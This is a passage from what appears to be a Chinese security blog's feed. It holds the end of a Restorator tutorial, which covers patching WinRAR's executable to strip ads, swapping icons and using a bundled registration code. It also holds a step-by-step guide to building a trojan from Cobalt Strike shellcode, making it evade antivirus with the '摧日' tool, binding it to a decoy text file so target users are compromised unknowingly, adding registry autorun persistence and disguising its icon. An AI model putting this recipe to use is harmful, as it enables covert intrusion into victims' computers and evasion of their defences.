information”</p></blockquote><p>注意：要保留引号，逗号等等，格式要与之前保持一致，避免马虎。改好之后，左上菜单选择“文件”→“另存为”，将这个.rc文件保存。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322511535.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第8张"></p><h4 id="5、导入已保存的-rc文件">5、导入已保存的.rc文件</h4><p>这一步，我们把刚才已保存的.rc文件导入到Restorator 2018。操作与之前类似，先在左侧资源树点“+”展开“字符串”，然后右键点击“中文(xxx)”，菜单中选择“导入”→“导入…”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322575625.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第9张"></p><p>打开刚才保存的.rc文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132705168905322566301.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第10张"></p><p>此时可以看到Restorator 2018右侧的查看器内，已经是之前.rc的新内容（第1277行代码已经被覆盖），接下来选择“文件”→“另存为”，</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132706168905322653221.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第11张"></p><p>另存为一个新的exe文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322642506.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第12张"></p><h4 id="6、覆盖源WinRAR-exe文件">6、覆盖源WinRAR.exe文件</h4><p>接下来，我们把这个新WinRAR.exe，粘贴到WinRAR目录，覆盖原安装目录exe同名程序即可大功告成！</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322630189.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第13张"></p><p>好啦，现在你再启动WinRAR！再也没有弹窗广告了！</p><h3 id="案例二：修改软件标题">案例二：修改软件标题</h3><p>1、首先载入我们需要修改的软件：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132708168905322863622.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第14张"></p><p>2、先更改成“编辑模式”。方法：单机“查看器”——“编辑模式”即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132709168905322970763.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第15张"></p><p>3、在“资源树”里找到“对话框”——“101”，在右侧“标题”修改你希望看到的软件标题栏显示内容。中间的“资源查看器”会有预览。效果图如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132715168905323546042.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第16张"></p><p>4、然后在“资源树”里找到“对话框”——“112”这一项。我们只需单击我们想改的文字，在右侧“标题”下方修改即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132717168905323752094.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第17张"></p><p>5、修改完成后的效果如下：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132725168905324596468.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第18张"></p><p>6、然后就是修改图标。这里拿logo来演示！ico图标分辨率为32x32：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132726168905324639140.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第19张"></p><p>7、“资源树”——“图标”——“105”，右击“105”——“导入”——“导入到”，把ZOL导入；接着用同样的方法把图标导入到“108”中：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132731168905325163742.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第20张"></p><p>8、单击查看效果如何：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132733168905325316894.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第21张"></p><p>9、在“资源树”里找到“版本”项：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132735168905325574811.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第22张"></p><p>10、右下方就是我们要修改的内容了。可以把自己的个人信息都写进去：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132737168905325796822.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第23张"></p><h3 id="案例三：修改软件图标">案例三：修改软件图标</h3><p>1、进去主界面后，如果需要填写注册码，打开“汉化说明”这个文本特别信息中的就是注册码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132741168905326172413.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第24张"></p><p>2、打开你要修改的文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132742168905326273146.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第25张"></p><p>3、打开文件后，左侧资源树点击（红1）小三角拉开，把图标项也拉开（红2），现在看到（红3）的是该文件的包含的所有ICON，选中后可以看到图标的信息。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132744168905326485900.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第26张"></p><p>4、选中图标_5000，可以在资源查看器看到ICON的信息（红1），可以看出来这个文件的图标格式是比较多的，往下拉（红2）就可以看到RGB/A的图像信息，目前看到的是16色信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132745168905326538644.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第27张"></p><p>5、256<em>128</em>96<em>64</em>48<em>32</em>24<em>16-RGB/A、256</em>128<em>96</em>64<em>48</em>32<em>24</em>16-256色、256<em>128</em>96<em>64</em>48<em>32</em>24*16-16色以上是图标项-5000图像信息，替换新的ICON进来时请确保图标信息要和原来的格式/数量一致！</p><p>6、为了达到安全稳定的使用效果，请逐个检查你将要选择替换的ICON项的格式和数量，确保替换一致。</p><p>7、请将你要替换的ico全部放到同一个文件夹里面，并对应图标在应用文件里面的编号（红1），比如：5000对应的是安全，5004对应的是防火墙……（红2）这里是文件游览器，方便我们查看要替换用的ICON。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132746168905326653562.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第28张"></p><p>8、将你要替换的图标整理到同一个文件夹下，然后用文件游览器找到并进入（红2），直到看到所有已经编号好的图标（红1）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132748168905326864697.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第29张"></p><p>9、如果你的准备工作做好了，我们就要开始批量替换图标了。</p><p>10、右键左边资源树的图标项（文件夹图标），选择导入(O)，点击自动导入所有&quot;图标&quot;类型(Z)</p><p>11、导入完后，直接按F12另存为，保存完成了！</p>]]></content>
    
    
    <summary type="html">🥧Restorator常见使用方法</summary>
    
    
    
    <category term="web渗透" scheme="https://m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>免杀木马+文件捆绑+权限伪装</title>
    <link href="https://m3x1.cn/posts/1bec3970.html"/>
    <id>https://m3x1.cn/posts/1bec3970.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:27:47.018Z</updated>
    
    <content type="html"><![CDATA[<h1>免杀木马+文件捆绑+权限伪装</h1><ul><li><p><strong>文章前言</strong></p><p>通过学习使用Cobalt Strike来制作木马，使用摧日对其进行免杀覆盖，使用GoFilebinder对其进行免杀捆绑，最后利用Restorator对其进行图标修改。</p></li><li><p><strong>环境和软件准备</strong></p><p>\1. 一台windows系统的电脑作为攻击机</p><p>2.一台靶机</p><p>3.Cobalt Strike</p><p>4.摧日</p><p>5.GoFilebinder</p><p>6.Restorator</p></li><li><p><strong>工具介绍</strong></p><p>摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马主要支持C语言的shellcode和纯十六进制的shellcode<br>GoFileBinder：golang免杀捆绑器<br>Restorator：一款修改exe执行程序图标的小工具</p></li><li><p><strong>正文开始</strong></p><p>选用cs中的c格式shellcode，用cs生成一个c语言的相关东西，同时勾选上x64</p></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGTurmQDUUoIkwBgIUztkiayF20PQOFDEGIDPwCsExIlZMoXWZtqhbHUQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPsqAbCOyCY0LR1zGsKphmjGtM7UdiarEu9KtVXqAiaJqUXDe5fkibo8HQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>完成以上步骤后，接下来便开始对其进行免杀操作，用到的工具摧日对其进行免杀处理</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGWGKt2ibzRFhNE3XWAQ4SNIDDgcx9iasydQDQ76s0lDdwIoL6lz3QSJnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>使用前请先获取相关工具，并确保已经安装工具所需要的的go环境，至于go环境安装请各位自行查阅本文不在做出相关介绍，安装完毕后进行下一步操作。复制上一步中生成的c文件的中的相关字符，将其另存为一个新的文档，并将该文档与摧日工具的exe文件放在一个目录之中，并运行工具，运行成功后将会得到免杀后的文件hoshino.exe。用相关管家进行查杀后，都可以正常通过。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGe2AiaWzWQRTVAaDMS4PdZJB2OwscrU2Od3UElHEbaB4alWSVxILs1ww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGLFv5IbhM97F127XqH2teAoYrFOK0Aia24fdlAPrVrl1fdd364prbZ6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>然后进行的操作是将这个马和正常的东西捆绑在一起，这个东西可以是可执行文件exe，也可以是文本txt，也可以是文档doc，任何你想的东西都可以进行捆绑。<br>最后实现的效果是：目标用户点击你发送的恶意文件之后会在你的CS客户端上上线，而且目标用户打开的文件可以正常的使用，并且你的木马文件会自动迁移到C:\Users\Public<br>下面将木马和一个txt文本文件进行捆绑：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGR4x3GXibUMMPPmiaD0gDe0FXbg4KGzwKb8rMEI8y18Iga8ic9YcyqORXg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>将木马和txt文本文件还有GoFileBinder放在同级目录下，运行后得到如下结果，其中新出现的bilibili.exe就是我们要得到的文件</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGGRG2ibtmIjhvOkPhxzToHfPmVSH88PDGicKjLERicaxtQcsphHztxHg6g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>进行相关测试，将得到的文件双击后，该文件便会消失，在桌面上打开的便是我们所预设的ceshi.txt，并且我们的原文间将会自动一直到public目录下，cs也显示主机已经上线，至此所有工作已全部完成。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcG1F5yKYmDyIqj4H7s2ibdN7w5tPWFIm6hDrVsjlCyDSeWYx28IWgcI1w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/640" alt="图片"></p><p>最后一步，权限维持，如果不进行权限维持的话，目标用户在进行电脑重启后便会让改文件关闭，因此便需要用对其增加开机自启的相关操作，其后续路径因为程序会自动移动到public目录下便很好就能设置，</p><ul><li></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPjicPN7J7OvoS4UJvyzEkic3qlqUYl4Nby6ImRM2YopEtia00jpm7Zv3w/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>最后利用Restorator工具对该文件进行图标美化操作，可以将其伪装成一些较为常见的进程图标，该工具的使用较为方便，本文在这里便不再进行相关的阐述，请自行理解！</p>]]></content>
    
    
    <summary type="html">🥧免杀木马+文件捆绑+权限伪装</summary>
    
    
    
    <category term="web渗透" scheme="https://m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
